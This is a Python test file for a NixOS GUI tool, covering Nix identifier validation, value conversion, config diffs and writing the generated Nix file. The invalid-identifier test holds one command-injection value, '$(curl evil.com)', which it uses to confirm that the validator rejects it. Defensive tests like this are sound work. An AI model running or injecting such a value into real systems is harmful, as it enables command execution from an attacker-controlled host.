# apply engine tests
import sys

sys.path.insert(0, "src")

from nixos_gui.apply import (
    _validate_nix_ident,
    compute_diff,
    diff_to_text,
    check_bootstrap,
    write_nix,
    BOOTSTRAP_MARKER,
)
from nixos_gui.codegen import _nix_value
from nixos_gui.state import Intent, IntentType


class TestValidation:
    def test_valid_ident(self):
        assert _validate_nix_ident("firefox")
        assert _validate_nix_ident("my-package")
        assert _validate_nix_ident("my'pkg")
        assert _validate_nix_ident("_private")

    def test_invalid_ident(self):
        assert not _validate_nix_ident("")
        assert not _validate_nix_ident('$(curl evil.com)')


class TestNixConversion:
    def test_bool(self):
        assert _nix_value(True) == "true"
        assert _nix_value(False) == "false"

    def test_string(self):
        assert _nix_value("hello") == '"hello"'

    def test_string_escape(self):
        # $ must be escaped (nix string interpolation)
        assert "\\$" in _nix_value("$HOME")

    def test_number(self):
        assert _nix_value(42) == "42"

    def test_none(self):
        assert _nix_value(None) == "null"

    def test_list(self):
        # nix lists are space-separated, not comma-separated
        assert _nix_value([1, "a"]) == '[ 1 "a" ]'

    def test_dict(self):
        result = _nix_value({"x": 1})
        assert "x = 1;" in result




class TestDiff:
    def test_compute_add(self):
        intents = [Intent(IntentType.ADD_PACKAGE, "curl")]
        entries = compute_diff(intents, _FakeReader(packages=["vim"]))
        assert len(entries) == 1
        assert entries[0].change_type == "add"

    def test_compute_remove(self):
        intents = [Intent(IntentType.REMOVE_PACKAGE, "vim")]
        entries = compute_diff(intents, _FakeReader(packages=["vim"]))
        assert len(entries) == 1
        assert entries[0].change_type == "remove"

    def test_compute_set(self):
        intents = [Intent(IntentType.SET_OPTION, "services.foo.enable",
                          value=True)]
        entries = compute_diff(intents, _FakeReader(packages=[]))
        assert len(entries) == 1
        assert entries[0].change_type == "modify"

    def test_compute_empty(self):
        entries = compute_diff([], _FakeReader(packages=[]))
        assert len(entries) == 0

    def test_diff_to_text(self):
        from nixos_gui.apply import DiffEntry
        entries = [DiffEntry("pkg.curl", "(none)", "curl", "add")]
        text = diff_to_text(entries)
        assert "pkg.curl" in text
        assert "# nixos-gui" in text


class _FakeReader:
    # minimal mock of NixConfigReader for diff tests
    def __init__(self, packages=None, options=None, config_path=None):
        self.is_nixos = True
        self._packages = packages or []
        self._options = options or {}
        self.config_path = config_path

    def get_packages(self):
        return self._packages

    def get_options_batch(self, paths, allow_heavy=False):
        return {p: self._options.get(p) for p in paths if p in self._options}


class TestWriteNix:
    def test_bootstrap_marker_present(self, tmp_path):
        # write_nix output must contain the bootstrap marker
        intents = [Intent(IntentType.ADD_PACKAGE, "curl")]
        nix_file = tmp_path / "nixos-gui.nix"
        reader = _FakeReader(config_path=str(tmp_path))
        result = write_nix(intents, reader, nix_path=nix_file)
        assert result.success
        content = nix_file.read_text()
        assert BOOTSTRAP_MARKER in content

    def test_preserves_user_content_above_marker(self, tmp_path):
        # user content above the marker must be preserved on rewrite
        nix_file = tmp_path / "nixos-gui.nix"
        user_header = "{ ... }:\n{\n  imports = [ ./generated.nix ];\n}\n"
        nix_file.write_text(user_header + BOOTSTRAP_MARKER + "\n{ }\n")
        intents = [Intent(IntentType.ADD_PACKAGE, "curl")]
        reader = _FakeReader(config_path=str(tmp_path))
        result = write_nix(intents, reader, nix_path=nix_file)
        assert result.success
        content = nix_file.read_text()
        # user header preserved
        assert "imports" in content
        # marker still there
        assert BOOTSTRAP_MARKER in content
        # package added
        assert "curl" in content

    def test_first_write(self, tmp_path):
        # first write creates the file with marker + module header
        intents = [Intent(IntentType.ADD_PACKAGE, "vim")]
        nix_file = tmp_path / "nixos-gui.nix"
        reader = _FakeReader(config_path=str(tmp_path))
        result = write_nix(intents, reader, nix_path=nix_file)
        assert result.success
        content = nix_file.read_text()
        assert BOOTSTRAP_MARKER in content
        assert "{ config, pkgs, lib, ... }:" in content
        assert "vim" in content
